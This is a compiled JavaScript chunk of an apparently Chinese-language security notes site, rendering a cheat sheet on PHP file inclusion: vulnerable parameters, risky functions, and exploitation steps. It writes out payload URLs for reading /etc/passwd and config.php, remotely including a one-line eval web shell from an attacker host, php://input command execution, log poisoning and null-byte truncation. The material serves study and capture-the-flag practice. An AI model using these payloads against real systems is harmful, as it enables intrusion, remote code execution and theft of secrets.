(window.webpackJsonp=window.webpackJsonp||[]).push([[37],{782:function(s,a,t){"use strict";t.r(a);var e=t(1),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"_0x01-典型特征"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-典型特征"}},[s._v("#")]),s._v(" 0x01. 典型特征")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("?page=a.php\n?home=b.html\n?file=content\n?name=a.php\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("h2",{attrs:{id:"_0x02-php常见导致文件包含的函数"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-php常见导致文件包含的函数"}},[s._v("#")]),s._v(" 0x02. php常见导致文件包含的函数：")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include_once")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("require")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("require_once")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("fopen")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("readfile")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("h2",{attrs:{id:"_0x03-利用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-利用"}},[s._v("#")]),s._v(" 0x03. 利用")]),s._v(" "),t("ol",[t("li",[s._v("读取文件")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://www.xxser.com/index.php?page=/etc/passwd\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("ol",{attrs:{start:"2"}},[t("li",[s._v("远程包含shell"),t("br"),s._v("\nallow_url_fopen=on 情况下")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://www.example.com/index.php?page=http://www.attacker.com/echo.txt\n其中echo.txt内容为:<?php eval($_POST[xxser]);?>\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("ol",{attrs:{start:"3"}},[t("li",[s._v("本地包含配合文件上传漏洞包含shell")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("上传一句话木马文件后，通过文件包含利用，非php扩展文件被包含后也会被当作php解析\nhttp://www.example.com/index.php?page=./uploadfile/xxx.jpg\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("ol",{attrs:{start:"4"}},[t("li",[s._v("PHP协议")])]),s._v(" "),t("ul",[t("li",[s._v("php://filter"),t("br"),s._v("\n一种元封装器，用于数据流打开时的筛选过滤应用")])]),s._v(" "),t("div",{staticClass:"language-url line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-url"}},[t("code",[t("span",{pre:!0,attrs:{class:"token scheme"}},[s._v("http"),t("span",{pre:!0,attrs:{class:"token scheme-delimiter"}},[s._v(":")])]),t("span",{pre:!0,attrs:{class:"token authority"}},[t("span",{pre:!0,attrs:{class:"token authority-delimiter"}},[s._v("//")]),t("span",{pre:!0,attrs:{class:"token host"}},[s._v("www.example.com")])]),t("span",{pre:!0,attrs:{class:"token path"}},[t("span",{pre:!0,attrs:{class:"token path-separator"}},[s._v("/")]),s._v("index.php")]),t("span",{pre:!0,attrs:{class:"token query"}},[t("span",{pre:!0,attrs:{class:"token query-delimiter"}},[s._v("?")]),t("span",{pre:!0,attrs:{class:"token pair"}},[t("span",{pre:!0,attrs:{class:"token key"}},[s._v("page")]),s._v("="),t("span",{pre:!0,attrs:{class:"token value"}},[s._v("php://filter/read=convert.base64-encode/resource=config.php")])])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("ul",[t("li",[s._v("php://input"),t("br"),s._v("\nphp://input是个可以访问请求的原始数据的只读流,可以接收post请求，将请求作为PHP代码的输入传递给目标变量")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('http://www.example.com/index.php?page=php://input\n实例：\nPOST /?file=php://input\n<?php system("cat /flag");?>\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("ol",{attrs:{start:"5"}},[t("li",[s._v("包含日志文件")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("先访问：http://www.example.com/<?php phpinfo();?>生成日志\n再访问：http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log\n关键在于确定apache路径\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("ol",{attrs:{start:"6"}},[t("li",[s._v("截断包含"),t("br"),s._v("\nmagic_quotes_gpc=off 情况下")])]),s._v(" "),t("div",{staticClass:"language-url line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-url"}},[t("code",[t("span",{pre:!0,attrs:{class:"token scheme"}},[s._v("http"),t("span",{pre:!0,attrs:{class:"token scheme-delimiter"}},[s._v(":")])]),t("span",{pre:!0,attrs:{class:"token authority"}},[t("span",{pre:!0,attrs:{class:"token authority-delimiter"}},[s._v("//")]),t("span",{pre:!0,attrs:{class:"token host"}},[s._v("www.example.com")])]),t("span",{pre:!0,attrs:{class:"token path"}},[t("span",{pre:!0,attrs:{class:"token path-separator"}},[s._v("/")]),s._v("index.php")]),t("span",{pre:!0,attrs:{class:"token query"}},[t("span",{pre:!0,attrs:{class:"token query-delimiter"}},[s._v("?")]),t("span",{pre:!0,attrs:{class:"token pair"}},[t("span",{pre:!0,attrs:{class:"token key"}},[s._v("page")]),s._v("="),t("span",{pre:!0,attrs:{class:"token value"}},[s._v("1.jpg%00")])])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])])])}),[],!1,null,null,null);a.default=n.exports}}]);